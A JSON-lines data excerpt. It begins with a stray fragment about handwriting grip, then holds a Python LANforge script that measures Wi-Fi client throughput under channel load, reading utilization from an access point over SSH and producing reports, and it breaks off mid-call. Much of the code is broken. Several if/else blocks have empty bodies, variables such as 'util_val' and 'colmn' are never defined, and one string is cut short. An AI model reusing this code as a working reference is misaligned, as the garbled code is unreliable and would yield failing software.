changes depending on the size of the character to be written, with a firmer grip for smaller characters and a looser grip for larger characters."}
{"text": "# language: Python\n#!/usr/bin/env python3\r\n\r\n\"\"\"\r\nthroughput.py will\n\"\"\"\r\n\r\nimport sys\r\nimport importlib\r\nimport paramiko\r\nimport argparse\r\nimport pprint\r\nfrom datetime import datetime\r\nimport time\r\nimport traceback\r\nimport os\r\nimport matplotlib.patches as mpatches\r\nimport pandas as pd\r\nimport logging\r\n\r\nif sys.version_info[0]!= 3:\r\n    print(\"This script requires Python 3\")\r\n    exit(1)\r\n\r\n\r\nsys.path.append(os.path.join(os.path.abspath(__file__ + \"../../../\")))\r\n\r\nLFUtils = importlib.import_module(\"py-json.LANforge.LFUtils\")\r\nlfcli_base = importlib.import_module(\"py-json.LANforge.lfcli_base\")\r\nLFCliBase = lfcli_base.LFCliBase\r\nrealm = importlib.import_module(\"py-json.realm\")\r\nRealm = realm.Realm\r\nlf_report = importlib.import_module(\"py-scripts.lf_report\")\r\nlf_graph = importlib.import_module(\"py-scripts.lf_graph\")\r\nlf_kpi_csv = importlib.import_module(\"py-scripts.lf_kpi_csv\")\r\nlogger = logging.getLogger(__name__)\r\nlf_logger_config = importlib.import_module(\"py-scripts.lf_logger_config\")\r\ncreate_bridge = importlib.import_module(\"py-scripts.create_bridge\")\r\nCreateBridge = create_bridge.CreateBridge\r\n\r\n'''\r\nif sys.version_info[0]!= 3:\r\n    print(\"This s\n'''\r\n\r\nclass IPV4VariableTime(Realm):\r\n    def __init__(self, ssid=None,   security=None,       password=None,   sta_list=[],   name_prefix=None,   upstream=None,\r\n                 radio=None,        host=\"localhost\",    port=8080,       mode=0,        ap=None,            side_a_min_rate= 56,\r\n                 side_a_max_rate=0, side_b_min_rate=56,  side_b_max_rate=0,              number_template=\"00000\",\r\n                 test_duration=\"5m\", use_ht160=False,    _debug_on=False,                _exit_on_error=False,\r\n                 _exit_on_fail=False, _vap_radio=None,   _vap_list = 'vap0000', _dhcp = True ):\r\n        super().__init__(lfclient_host=host, lfclient_port=port),\r\n        self.upstream = upstream\r\n        self.host = host\r\n        self.port = port\r\n        self.ssid = ssid\r\n        self.sta_list = sta_list\r\n        self.vap_list = _vap_list\r\n        self.security = security\r\n        self.password = password\r\n        self.radio = radio\r\n        self.vap_radio = _vap_radio\r\n        self.mode = mode\r\n        self.ap = ap\r\n        self.number_template = number_template\r\n        self.debug = _debug_on\r\n        self.name_prefix = name_prefix\r\n        self.test_duration = test_duration\r\n        self._dhcp = _dhcp\r\n        self.local_realm = realm.Realm(lfclient_host=self.host, lfclient_port=self.port)\r\n\r\n        # initializing station profile\r\n        '''\r\n        self.station_profile = StationProfile(lfclient_url=self.lfclient_url,   local_realm=super(), debug_=self.debug,     up=False,\r\n                                              dhcp = self._dhcp,                ssid = self.ssid,    ssid_pass = self.password,\r\n        '''\r\n        self.station_profile = self.local_realm.new_station_profile()\r\n\r\n        if self.station_profile.use_ht160:\r\n            self.station_profile.mode = 9\r\n        self.station_profile.mode = mode\r\n\r\n\r\n        # initializing VAP profile\r\n        self.vap_profile = self.new_vap_profile()\r\n        self.vap_profile.vap_name = self.vap_list\r\n        self.vap_profile.ssid = self.ssid\r\n        self.vap_profile.security = self.security\r\n        self.vap_profile.ssid_pass = self.password\r\n        self.vap_profile.mode = self.mode\r\n        if self.debug:\r\n            logger.info(\"----- VAP List ----- ----- ----- ----- ----- ----- \\n\")\r\n            pprint.pprint(self.vap_list)\r\n            logger.info(\"---- ~VAP List ----- ----- ----- ----- ----- ----- \\n\")\r\n\r\n        self.cx_profile = self.new_l3_cx_profile()\r\n        self.cx_profile.host = self.host\r\n        self.cx_profile.port = self.port\r\n        self.cx_profile.name_prefix = self.name_prefix\r\n        self.cx_profile.side_a_min_bps = side_a_min_rate\r\n        self.cx_profile.side_a_max_bps = side_a_max_rate\r\n        self.cx_profile.side_b_min_bps = side_b_min_rate\r\n        self.cx_profile.side_b_max_bps = side_b_max_rate\r\n\r\n\r\n    def start(self, print_pass=False, print_fail=False):\r\n        self.station_profile.admin_up() # admin up the stations\r\n        temp_stas = self.station_profile.station_names.copy()\r\n\r\n        if self.wait_for_ip(temp_stas):\r\n            logger.info(\"admin-up....\")\r\n            self._pass(\"All stations got IPs\")\r\n        else:\r\n            self._fail(\"Stations failed to get IPs\")\r\n            self.exit_fail()\r\n\r\n    def stop(self,trf = True, ad_dwn = True):\r\n        if trf:\r\n        if ad_dwn:\r\n            self.station_profile.admin_down()   # admin down the stations\r\n\r\n    def pre_cleanup(self):\r\n        logger.info(\"clearing...\")\r\n        exist_sta = []\r\n        for u in self.json_get(\"/port/?fields=port+type,alias\")['interfaces']:\r\n            if list(u.values())[0]['port type'] not in ['Ethernet', 'WIFI-Radio', 'NA']:\r\n                exist_sta.append(list(u.values())[0]['alias'])\r\n        self.station_profile.cleanup(desired_stations=exist_sta)\r\n        try:\r\n            exist_l3 = list(filter(lambda cx_name: cx_name if (cx_name!= 'handler' and cx_name!= 'uri') else False,\r\n                                   self.json_get(\"/cx/?fields=name\")))\r\n            list(map(lambda i: self.rm_cx(cx_name=i), exist_l3))\r\n            list(map(lambda cx_name: [self.rm_endp(ename=i) for i in [f\"{cx_name}-A\", f\"{cx_name}-B\"]], exist_l3))\r\n        except Exception as e:\r\n            print(\"###\",e,'###')\r\n\r\n    def build_vaps(self,chn = 36):\r\n        self.vap_profile.use_security(self.security, self.ssid, passwd=self.password)\r\n        self.vap_profile.set_command_param(\"set_port\", \"ip_addr\", \"192.168.0.1\")\r\n        self.vap_profile.set_command_flag(\"set_port\", \"ip_address\", 1)\r\n        self.vap_profile.set_command_param(\"set_port\", \"netmask\", \"255.255.255.0\")\r\n        self.vap_profile.set_command_flag(\"set_port\", \"ip_Mask\", 1)\r\n        self.vap_profile.set_command_param(\"set_port\", \"gateway\", \"192.168.0.1\")\r\n        self.vap_profile.set_command_flag(\"set_port\", \"ip_gateway\", 1)\r\n        self.vap_profile.set_command_flag(\"set_port\", \"use_dhcp\", 1)\r\n        logger.info(\"Creating VAPs\")\r\n        '''\r\n        self.vap_profile.create(resource = 1,   radio = self.vap_radio,     channel = int(chn),       up_ = True,     debug = False,\r\n                                suppress_related_commands_ = True,          use_radius = True,  hs20_enable = False,\r\n                                create_bridge = False)\r\n        '''\r\n        self.vap_profile.create(resource=1, radio=self.vap_radio, channel=int(chn), up=True, debug=False,\r\n                                suppress_related_commands_=True, use_radius=True, hs20_enable=False)\r\n        self._pass(\"PASS: VAP build finished\")\r\n\r\n        logger.info(\"Creating Bridge\")\r\n        self.create_bridge = CreateBridge(_host=args.mgr,\r\n                                 _port=args.mgr_port,\r\n                                 _bridge_list=bridge_list,\r\n                                 _debug_on=args.debug,\r\n                                 target_device=args.target_device)\r\n\r\n    def build(self):\r\n        self.station_profile.use_security(self.security, self.ssid, self.password)\r\n        self.station_profile.set_number_template(self.number_template)\r\n        self.station_profile.set_command_flag(\"add_sta\", \"create_admin_down\", 1)\r\n        self.station_profile.set_command_param(\"set_port\", \"report_timer\", 1500)\r\n        self.station_profile.set_command_flag(\"set_port\", \"rpt_timer\", 1)\r\n        logger.info(\"Creating stations\")\r\n        start_ip = 2\r\n        if self._dhcp:\r\n            self.station_profile.create(radio=self.radio, sta_names_=self.sta_list, debug=self.debug)\r\n        else:\r\n            for sta_name in self.sta_list:\r\n                ip = \"192.168.0.\"+ str(start_ip)\r\n                self.station_profile.set_command_param(\"set_port\", \"ip_addr\", ip)\r\n                self.station_profile.set_command_flag(\"set_port\", \"ip_address\", 1)\r\n                self.station_profile.set_command_param(\"set_port\", \"netmask\", \"255.255.255.0\")\r\n                self.station_profile.set_command_flag(\"set_port\", \"ip_Mask\", 1)\r\n                self.station_profile.set_command_param(\"set_port\", \"gateway\", \"192.168.0.1\")\r\n                self.station_profile.set_command_flag(\"set_port\", \"ip_gateway\", 1)\r\n\r\n                self.station_profile.create(radio=self.radio, sta_names_=[sta_name], debug=self.debug)\r\n                start_ip += 1\r\n        self.cx_profile.create(endp_type=\"lf_udp\", side_a=self.station_profile.station_names, side_b=self.upstream, sleep_time=0)\r\n        self._pass(\"PASS: Station build finished\")\r\n\r\n    def chn_util(self,ssh_root, ssh_passwd,channnel=0):\r\n        cmd = 'iwpriv wifi1vap0 get_chutil'     # command to get channel utilization\r\n        try:\r\n            ssh = paramiko.SSHClient()\r\n            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\r\n            ssh.connect(ssh_root, 22, 'root', ssh_passwd)\r\n            time.sleep(20)\r\n            stdout = ssh.exec_command(cmd)\r\n            stdout = (((stdout[1].readlines())[0].split(':'))[1].split(' '))[0]\r\n            print(stdout, \"----- channel utilization\")\r\n            return int(stdout)\r\n        except paramiko.ssh_exception.NoValidConnectionsError as e:\r\n            logger.info(\"#### %s ####\", e)\r\n            exit(1)\r\n        except TimeoutError as e:\r\n            # print(\"####\", e, \"####\")\r\n            exit(1)\r\n\r\n    def re_run_traff(self, adj_trf_rate, add_sub_rate):\r\n        logger.info(\"Re-run the traffic...\")\r\n        self.cx_profile.cleanup_prefix()\r\n        time.sleep(.5)\r\n        if add_sub_rate == \"sub\":\r\n            self.cx_profile.side_a_min_bps = abs(int(self.cx_profile.side_a_min_bps) - adj_trf_rate)\r\n            self.cx_profile.side_b_min_bps = abs(int(self.cx_profile.side_b_min_bps) - adj_trf_rate)\r\n        elif add_sub_rate == \"add\":\r\n            self.cx_profile.side_a_min_bps = int(self.cx_profile.side_a_min_bps) + adj_trf_rate\r\n            self.cx_profile.side_b_min_bps = int(self.cx_profile.side_b_min_bps) + adj_trf_rate\r\n        self.cx_profile.created_cx.clear()\r\n        self.cx_profile.create(endp_type=\"lf_udp\", side_a=self.station_profile.station_names, side_b=self.upstream,\r\n                               sleep_time=0)\r\n        self.cx_profile.start_cx()\r\n        print(f\"-------side_a_min_bps  {self.cx_profile.side_a_min_bps}\\n-------side_b_min_bps  {self.cx_profile.side_b_min_bps}\")\r\n\r\n    def table(self,report, title, data, dis=\"\"):\r\n        report.set_obj_html(_obj_title=\"\",_obj=dis)\r\n        report.set_table_title(title)\r\n        report.build_table_title()\r\n        report.build_objective()\r\n        report.set_table_dataframe(data)\r\n        report.build_table()\r\n\r\n    def grph(self,report, dis=\"\", data_set=None, xaxis_name=\"stations\", yaxis_name=\"Throughput 2 (Mbps)\",\r\n             xaxis_categories=None, label=None, graph_image_name=\"\", multi_bar_width = 0,\r\n             xticks_font=10,step = 1):\r\n        report.set_obj_html(_obj_title=graph_image_name, _obj=dis)\r\n        #report.set_graph_title(graph_image_name)\r\n        #report.build_graph_title()\r\n        report.build_objective()\r\n        graph = lf_graph.lf_bar_graph(_data_set = data_set,\r\n                             _xaxis_name = xaxis_name,\r\n                             _yaxis_name = yaxis_name,\r\n                             _xaxis_categories = xaxis_categories,\r\n                             _graph_image_name = graph_image_name.replace(\" \",\"_\"),\r\n                             _label = label,\r\n                             _color = ['darkorange','forestgreen','blueviolet'],\r\n                             _color_edge = 'black',\r\n                             _figsize = (10, 5),\r\n                             _xticks_font= xticks_font,_xaxis_value_location=multi_bar_width,\r\n                             _xaxis_step = step,_legend_handles=None, _legend_loc=\"best\", _legend_box=(1.0,0.5), _legend_ncol=1)\r\n        graph_png = graph.build_bar_graph()\r\n        logger.info(\"graph name {}\".format(graph_png))\r\n        report.set_graph_image(graph_png)\r\n        report.move_graph_image()\r\n        report.build_graph()\r\n\r\n    def generates_csv(self, _columns=None, _rows=None, _filename='test.csv' ):\r\n        if _columns is None:\r\n            _columns = ['Stations', 'bk', 'be', 'vi', 'vo']\r\n        if _rows is None:\r\n            _rows = [['sta0001','sta0002','sta0003','sta0004','sta0005'],\r\n                     [1, 2, 3, 4, 5],\r\n                     [11, 22, 33, 44, 55],\r\n                     [6, 7, 8, 9, 10],\r\n                     [66, 77, 88, 99, 100]]\r\n        rows = _rows\r\n        columns = _columns\r\n        filename = _filename\r\n\r\n        df = {}\r\n        for i in range(len(columns)):\r\n            df[columns[i]] = rows[i]\r\n        csv_df = pd.DataFrame(df)\r\n        logger.info(csv_df)\r\n        csv_df.to_csv(filename, index=False, encoding='utf-8', na_rep='NA', float_format='%.2f')\r\n\r\n    def report(self,util, sta_num, bps_rx_a,bps_rx_b, rep_title, upload = 1000000, download = 1000000,\r\n              test_setup_info = None,input_setup_info = None,threshold=None):\r\n        '''if len(threshold) < len(util):\r\n            for i in range(len(util)):\r\n                try:\r\n                    tmp = threshold[i]\r\n                except IndexError as e:\r\n                    print(f\"Threshold {threshold} and utilization {util}\")\r\n                    threshold.append(100 - int(util[i]))\r\n        print(f\"threshold {threshold} and utilization {util}\")'''\r\n        rx_a,rx_b,pas_fail_up,pas_fail_down,pas_fail_info_up,pas_fail_info_down = [],[],[],[],[],[]\r\n        thrp_b = upload * len(sta_num)  # get overall upload values\r\n        thrp_a = download * len(sta_num)  # get overall download values\r\n        print(f\"given upload--{thrp_b} and download--{thrp_a} values\")\r\n        index = -1\r\n        for a in bps_rx_a:\r\n            index += 1\r\n            if len(a):\r\n                rx_a.append(f'Min: {min(a)} | Max: {max(a)} | Avg: {(sum(a) / len(a)):.2f} | Total: {sum(a):.2f}')\r\n                if thrp_a:\r\n                    print(f\"Expected throughput for util-{util[index]} and threshold-{threshold[index]}---- \"\r\n                          f\"{(thrp_a / 100) * (int(threshold[index]))} \\nGot overall download values for util \"\r\n                          f\"'{util[index]}'----- {sum(a)} \\n \")\r\n                    if (thrp_a / 100) * int(threshold[index]) <= sum(a) and min(a)!= 0:\r\n                    else:\r\n            else:\r\n                pas_fail_down.append(\"NA\")\r\n                rx_a.append(0)\r\n\r\n            if len(bps_rx_b[index]):\r\n                rx_b.append(f'Min: {min(bps_rx_b[index])} | Max: {max(bps_rx_b[index])} | '\r\n                            f'Avg: {(sum(bps_rx_b[index]) / len(bps_rx_b[index])):.2f} | Total: {sum(bps_rx_b[index]):.2f}')\r\n                if thrp_b:\r\n                    print(f\"Expected throughput for util-{util[index]} and threshold-{threshold[index]}---- \"\r\n                          f\"{(thrp_b / 100) * (int(threshold[index]))} \\nGot overall upload values for util \"\r\n                          f\"'{util[index]}'----- {sum(bps_rx_b[index])} \\n \")\r\n                    if (thrp_b / 100) * int(threshold[index]) <= sum(bps_rx_b[index]) and min(bps_rx_b[index])!= 0:\r\n                    else:\r\n            else:\r\n                pas_fail_up.append(\"NA\")\r\n                rx_b.append(0)\r\n\r\n            util[index] = f'{util[index]}%'  # append % to the util values\r\n\r\n        overall_tab = pd.DataFrame({\r\n            'Channel Utilization (%)': util, \"No.of.clients\": [len(sta_num)] * len(util),\r\n            'Intended Throughput(Mbps)': [f'upload: {upload} | download: {download}'] * len(util),\r\n            'Achieved Upload Throughput(Mbps)': rx_b, 'Achieved Download Throughput(Mbps)': rx_a\r\n        })\r\n        print(f\"overall table \\n{overall_tab}\")\r\n\r\n        pasfail_tab = pd.DataFrame({\r\n            'Channel Utilization (%)': util,\r\n            'Upload': pas_fail_up,\r\n            'Download': pas_fail_down\r\n        })\r\n        print(f\"pass-fail table \\n {pasfail_tab}\")\r\n        report = lf_report(_results_dir_name=\"Throughput_Under_Channel_Load\",_output_html=\"throughput_channel_load.html\",\r\n                           _output_pdf=\"throughput_channel_load.pdf\")\r\n        report.set_title(rep_title)\r\n        report.build_banner()\r\n        report.set_obj_html(_obj_title=\"Objective\",\r\n                            _obj=f\"This test is designed to measure the throughput of {len(sta_num)} clients connected on 5GHz\"\r\n                                 \" radio when the channel was already utilized with different percentage\")\r\n        report.build_objective()\r\n        # test setup information\r\n        report.set_table_title(\"Test Setup Information\")\r\n        report.build_table_title()\r\n        report.test_setup_table(test_setup_data=test_setup_info, value=\"Device Under Test\")\r\n        self.table(report, \"Min, Max, Avg Throughput\", overall_tab,\r\n              dis=f\"The below table gives the information about Min, Max, and Avg throughput \"\r\n                  f\"for the clients when channel utilized with {', '.join(util)}\")\r\n        self.table(report, \"Pass/Fail Criteria\", pasfail_tab, dis=f\"This table briefs about Pass/Fail criteria  \"\r\n             f\"for {', '.join(util)} channel utilization. If all the stations are able to run traffic and the overall throughput \"\r\n             f\"should meet the given threshold then the test is considered to be PASS. The test fails if the overall throughput \"\r\n            f\"is below the threshold value also if any one of the station is not able to run the layer-3 traffic.\")\r\n        if download:\r\n            self.grph(report,\r\n                 data_set=[[min(i) for i in bps_rx_a], [max(i) for i in bps_rx_a], [sum(i) / len(i) for i in bps_rx_a]],\r\n                 dis=f\"This graph represents the minimum, maximum and average throughput of \"\r\n                     f\"stations when channel was utilized with {', '.join(util)} for download traffic\",\r\n                 xaxis_name=\"Utilizations\", yaxis_name=\"Throughput (Mbps)\",\r\n                 xaxis_categories=util, label=[\"min\", \"max\", 'avg'],multi_bar_width = 0.25,\r\n                 graph_image_name=\"Download Throughput for all channel utilizations\",step=1)\r\n        if upload:\r\n            self.grph(report,\r\n                 data_set=[[min(i) for i in bps_rx_b], [max(i) for i in bps_rx_b], [sum(i) / len(i) for i in bps_rx_b]],\r\n                 dis=f\"This graph represents the minimum, maximum and average throughput of \"\r\n                     f\"stations when channel was utilized with {', '.join(util)} for upload traffic\",\r\n                 xaxis_name=\"Utilizations\", yaxis_name=\"Throughput (Mbps)\",\r\n                 xaxis_categories=util, label=[\"min\", \"max\", 'avg'],multi_bar_width = 0.25,\r\n                 graph_image_name=\"Upload Throughput for all channel utilization\",step= 1)\r\n        if len(sta_num) <= 40:\r\n            step = 1\r\n        elif 40 < len(sta_num) <= 80:\r\n            step = 3\r\n        elif 80 < len(sta_num) <= 100:\r\n            step = 5\r\n        else:\r\n            step = 10\r\n        for i in range(len(util)):\r\n            if download:\r\n                self.grph(report, data_set=[bps_rx_a[i]],\r\n                     dis=f\"The graph shows the individual throughput for all the connected stations on 5GHz radio \"\r\n                         f\"when channel was utilized with {util[i]} in download traffic\",\r\n                     xaxis_name=\"Stations\",yaxis_name=\"Throughput (Mbps)\", xaxis_categories=range(1, len(sta_num) + 1,step),\r\n                     label=[util[i]], graph_image_name=f\"Individual download throughput - CH{util[i]}\", xticks_font=7,step = step\r\n                   ,multi_bar_width = 0)\r\n            if upload:\r\n                self.grph(report, data_set=[bps_rx_b[i]],\r\n                     dis=f\"The graph shows the individual throughput for all the connected stations on 5GHz radio \"\r\n                         f\"when channel was utilized with {util[i]} in upload traffic\",\r\n                     xaxis_name=\"stations\", yaxis_name=\"Throughput (Mbps)\", xaxis_categories=range(1, len(sta_num) + 1,step),\r\n                     label=[util[i]], graph_image_name=f\"Individual upload throughput - CH{util[i]}\", xticks_font=7,step = step\r\n                   ,multi_bar_width = 0)\r\n        # input setup information\r\n        report.set_table_title(\"Input Setup Information\")\r\n        report.build_table_title()\r\n        report.test_setup_table(test_setup_data=input_setup_info, value=\"Information\")\r\n        report.build_footer()\r\n        html_file = report.write_html()\r\n        logger.info(\"returned file {}\".format(html_file))\r\n        logger.info(html_file)\r\n        report.write_pdf()\r\n        colmn.extend(range(1, len(self.bps_rx) + 1))\r\n        data = list(self.bps_rx.values())\r\n        data.insert(0, self.sta_list)\r\n        csv = self.generates_csv(_columns= colmn, _rows= data,\r\n                                 _filename='throughput_under_channel_load.csv')\r\n        csv.generate_csv()\r\n        report.csv_file_name = \"throughput_under_channel_load.csv\"\r\n        report.move_csv_file()\r\n\r\n    def monitor(self, duration_sec, monitor_interval, created_cx, col_names, iterations):\r\n        try:\r\n            duration_sec = Realm.parse_time(duration_sec).seconds\r\n        except:\r\n            if (duration_sec is None) or (duration_sec <= 1):\r\n                raise ValueError(\"L3CXProfile::monitor wants duration_sec > 1 second\")\r\n            if (duration_sec <= monitor_interval):\r\n                raise ValueError(\"L3CXProfile::monitor wants duration_sec > monitor_interval\")\r\n        if created_cx == None:\r\n            raise ValueError(\"Monitor needs a list of Layer 3 connections\")\r\n        if (monitor_interval is None) or (monitor_interval < 1):\r\n            raise ValueError(\"L3CXProfile::monitor wants monitor_interval >= 1 second\")\r\n\r\n        start_time = datetime.datetime.now()\r\n        end_time = start_time + datetime.timedelta(seconds=duration_sec)\r\n        # bps-rx-a (download) and bps-rx-b(upload) values are taken\r\n        self.bps_rx_a, self.bps_rx_b, self.bps_rx, index = [], [], {}, -1\r\n        bps_rx_a_avg,bps_rx_b_avg = [],[]\r\n        [(self.bps_rx_a.append([]), self.bps_rx_b.append([])) for i in range(len(created_cx))]\r\n        for test in range(1 + iterations):\r\n            while datetime.datetime.now() < end_time:\r\n                index += 1\r\n                response = list(self.json_get('/cx/%s?fields=%s' % (','.join(created_cx),\",\".join(col_names))).values())[2:]\r\n                self.bps_rx[index] = list(map(lambda i: [float(f\"{x / (1000000):.2f}\") for x in i.values()],response))\r\n                time.sleep(monitor_interval)\r\n        print(\"rx rate values are with [bps-rx-a, bps-rx-b] :-\\n\", self.bps_rx,\"\\n\\n\")\r\n        for index, key in enumerate(self.bps_rx):\r\n            for i in range(len(self.bps_rx[key])):\r\n                if self.cx_profile.side_b_min_bps!= '0' and self.cx_profile.side_b_min_bps!= 0:\r\n                    self.bps_rx_a[i].append(self.bps_rx[key][i][0])\r\n                if self.cx_profile.side_a_min_bps!= '0' and self.cx_profile.side_a_min_bps!= 0:\r\n                    self.bps_rx_b[i].append(self.bps_rx[key][i][1])\r\n        print(f\"bps-rx-a values-: \\n{self.bps_rx_a}\\nbps-rx-b values-: \\n{self.bps_rx_b}\")\r\n        if self.cx_profile.side_a_min_bps!= '0' and self.cx_profile.side_a_min_bps!= 0:\r\n            bps_rx_b_avg = [float(f\"{sum(i) / len(i):.2f}\") for i in self.bps_rx_b]\r\n        if self.cx_profile.side_b_min_bps!= '0' and self.cx_profile.side_b_min_bps!= 0:\r\n            bps_rx_a_avg = [float(f\"{sum(i) / len(i):.2f}\") for i in self.bps_rx_a]\r\n        return bps_rx_a_avg,bps_rx_b_avg\r\n\r\n    def check_util(self,real_cli_obj = None, util_list = None, real_cli = None,\r\n                   ssh_root = None, ssh_passwd = None,test_time = 0,up_down = [0],threshold=None,channnel=0):\r\n        bps_rx_a,bps_rx_b,sta_create,count = [],[],1,0\r\n        for util in util_list:  #  get throughput for every utilization values\r\n            if count > 0:\r\n                if len(up_down) > 0: # give data rate value and delete aggigned\r\n                    self.cx_profile.side_a_min_bps, self.cx_profile.side_b_min_bps = int(float(up_down[0])),int(float( up_down[0]))\r\n                    up_down.pop(0)\r\n            count += 1\r\n            stop_channel_load = 0\r\n            util_flag = 1\r\n            '''Loop until the expected channel utilization will get'''\r\n            while util_flag:\r\n                stop_channel_load += 1\r\n                '''STOP the script if unable to set the utilization for 20 times'''\r\n                if stop_channel_load >= 20:\r\n                    print(f\"Tried loading the channel with {util}% for {stop_channel_load} times...\\n\"\r\n                          f\"Unable to load the channel with {util}%\\nScript exiting...\")\r\n                    exit(1)\r\n\r\n                if (util - 3) <= util_val <= (util + 3):\r\n                    util_flag = 0\r\n                    if sta_create:\r\n                        sta_create = 0\r\n                    real_cli_obj.start(False, False)\r\n                    time.sleep(20)\r\n                    _bps_rx_a, _bps_rx_b = real_cli_obj.monitor(duration_sec=float(self.test_duration) * 60, monitor_interval=1,\r\n                                 created_cx=real_cli_obj.cx_profile.created_cx.keys(),\r\n                                 col_names=['bps rx a', 'bps rx b'], iterations=0)\r\n                    bps_rx_a.append(_bps_rx_a)\r\n                    bps_rx_b.append(_bps_rx_b)\r\n                    real_cli_obj.stop(trf=True,ad_dwn=False)\r\n                else:\r\n                    if util_val < (util - 3):\r\n                        logger.info(\"less than {}% util...\".format(util))\r\n                        if ((util ) - util_val) <= 4:\r\n                            self.re_run_traff(100000, \"add\")\r\n                        elif ((util ) - util_val) <= 8:\r\n                            self.re_run_traff(300000, \"add\")\r\n                        elif ((util ) - util_val) <= 12:\r\n                            self.re_run_traff(500000, \"add\")\r\n                        elif (util ) - util_val <= 16:\r\n                            self.re_run_traff(1000000, \"add\")\r\n                        elif (util ) - util_val > 16:\r\n                            self.re_run_traff(1500000, \"add\")\r\n\r\n                    elif util_val > (util + 3):\r\n                        logger.info(\"greater than {}% util...\".format(util))\r\n                        if (util_val - (util )) <= 4:\r\n                            self.re_run_traff(100000, \"sub\")\r\n                        elif (util_val - (util )) <= 8:\r\n                            self.re_run_traff(300000, \"sub\")\r\n                        elif (util_val - (util )) <= 12:\r\n                            self.re_run_traff(500000, \"sub\")\r\n                        elif util_val - (util ) <= 16:\r\n                            self.re_run_traff(1000000, \"sub\")\r\n                        elif util_val - (util ) > 16:\r\n                            self.re_run_traff(1500000, \"sub\")\r\n\r\n        print(f\"bps_rx_a {bps_rx_a}\\nbps_rx_b {bps_rx_b}\")\r\n\r\n        test_end = datetime.datetime.now().strftime(\"%b %d %H:%M:%S\")\r\n        logger.info(\"Test ended at %s\", test_end)\r\n\r\n        if len(threshold) < len(util_list):\r\n            for i in range(len(util_list)):\r\n                try:\r\n                    tmp = threshold[i]\r\n                except IndexError as e:\r\n                    print(f\"Threshold {threshold} and utilization {util_list}\")\r\n                    threshold.append(100 - int(util_list[i]))\r\n        print(f\"threshold {threshold} and utilization {util_list}\")\r\n        test_setup_info = {\r\n            \"AP Name\": self.ap,\r\n            \"SSID\": real_cli_obj.ssid,\r\n            'No.of stations': len(real_cli),\r\n            'Vap channel': channnel,\r\n            'Utilization': ', '.join(map(str,util_list)),\r\n            'Threshold': ', '.join(map(str,threshold)),\r\n            \"Total Test Duration\": datetime.datetime.strptime(test_end, '%b %d %H:%M:%S') - datetime.datetime.strptime(test_time, '%b %d %H:%M:%S')\r\n        }\r\n\r\n        input_setup_info = {\r\n            \"Contact\": \"support@candelatech.com\"\r\n        }\r\n        real_cli_obj.report(util = util_list, sta_num = real_cli,\r\n                                    bps_rx_a = bps_rx_a, bps_rx_b= bps_rx_b,\r\n                                    rep_title = \"Throughput Under Channel Load\",\r\n                                    upload = int(real_cli_obj.cx_profile.side_a_min_bps)/1000000,\r\n                                    download = int(real_cli_obj.cx_profile.side_b_min_bps)/1000000,\r\n                                    test_setup_info = test_setup_info,input_setup_info = input_setup_info,threshold= threshold)\r\n\r\n\r\ndef main():\r\n    try:\r\n        optional,required = [],[]\r\n        optional.append({'name': '--mode', 'help': 'Used to force mode of stations','default': 9})\r\n        optional.append({'name': '--ap_name', 'help': 'AP name'})\r\n        required.append({'name': '--ap_ip', 'help': 'IP of AP which was connected'})\r\n        optional.append({'name': '--test_duration', 'help': 'Sets the duration of the test in minutes', 'default': 1})\r\n        optional.append({'name':'--vap_channel', 'help':'To create VAP provide the AP channel', 'default': 36})\r\n        required.append({'name':'--vap_radio', 'help':'VAP radio', 'default': \"wiphy3\"})\r\n        optional.append({'name':'--util', 'help':'Channel utilization(provide whole number eg: 11,23,30,etc) with data_rate(bps) for that utilization',\r\n                         'default': \"20-3000000,40-6000000\"})\r\n        optional.append({'name':'--threshold', 'help':'Set the threshold for each utilization. '\r\n                          'By default it will take 100-util_value (eg: 100-20=80) in case user not providing the Threshold'})\r\n        required.append({'name':'--ap_password','help':'Password for AP'})\r\n        optional.append({'name': '--upload', 'help': 'Upload bps rate minimum for side_a of netgear', 'default': 0})\r\n        optional.append({'name': '--download', 'help': 'Download bps rate minimum for side_b of netgear', 'default': 0})\r\n        parser = Realm.create_basic_argparse(\r\n            prog='throughput.py',\r\n            formatter_class=argparse.RawTextHelpFormatter,\r\n            epilog='''\\\r\n                Measure the throughput for no.of clients when the channel was already utilized by specific load\r\n                ''',\r\n            description='''\\\r\n    throughput.py:\r\n    --------------------\r\n    Generic command layout:\r\n    Note:- \r\n    **** In case user providing 'Fractional part' to the input values while running, the script will automatically truncate \r\n    the Fractional part except the test_duration.\r\n    **** The script will automatically stop its execution when the channel is unable to load.\r\n    python3./throughput.py\r\n        --mode 1 {\"auto\"   : \"0\",\r\n            \"a\"      : \"1\",\r\n            \"b\"      : \"2\",\r\n            \"g\"      : \"3\",\r\n            \"abg\"    : \"4\",\r\n            \"abgn\"   : \"5\",\r\n            \"bgn\"    : \"6\",\r\n            \"bg\"     : \"7\",\r\n            \"abgnAC\" : \"8\",\r\n            \"anAC\"   : \"9\",\r\n            \"an\"     : \"10\",\r\n            \"bgnAC\"  : \"11\",\r\n            \"abgnAX\" : \"12\",\r\n            \"bgnAX\"  : \"13\"}\r\n        --upstream_port eth1\r\n        --vap_radio wiphy0\r\n        --vap_channel 36\r\n        --radio wiphy1\r\n        --num_stations 40\r\n        --security {open|wep|wpa|wpa2|wpa3}\r\n        --ssid netgear\r\n        --password admin123\r\n        --test_duration 1 (default)\r\n        --upload 3000000\r\n        --download 3000000\r\n        --util 20-2000000,40-000000\r\n        --threshold 80,50\r\n        --ap_ip 192.168.208.22\r\n        --ap_name WAC505\r\n        --ap_password Password@123xzsawq@!\r\n        --debug\r\n    ===============================================================================\r\n        ''', more_optional=optional, more_required = required)\r\n\r\n        args = parser.parse_args()\r\n\r\n        # set up logger\r\n        logger_config = lf_logger_config.lf_logger_config()\r\n        if args.lf_logger_config_json:\r\n            logger_config.lf_logger_config_json = args.lf_logger_config_json\r\n            logger_config.load_lf_logger_config()\r\n\r\n        bridge_list = \"br0\"\r\n        create_bridge = CreateBridge(_host=args.mgr,\r\n                            _port=args.mgr_port,\r\n                            _bridge_list=bridge_list,\r\n                            _debug_on=args.debug,\r\n                            target_device=args.target_device)\r\n\r\n        util_rate = args.util.split(',')\r\n        if args.threshold!= None:\r\n            threshold = [int(float(i)) for i in args.threshold.split(',')]\r\n        else:\r\n            threshold = []\r\n        util_list, rate_list = [],[]\r\n        for i in range(len(util_rate)):\r\n            util_list.append(util_rate[i].split('-')[0])\r\n            rate_list.append(util_rate[i].split('-')[1])\r\n        util_list = [int(float(i)) for i in util_list]\r\n\r\n        station_list = LFUtils.portNameSeries(prefix_=\"sta\", start_id_=0, end_id_= 3, 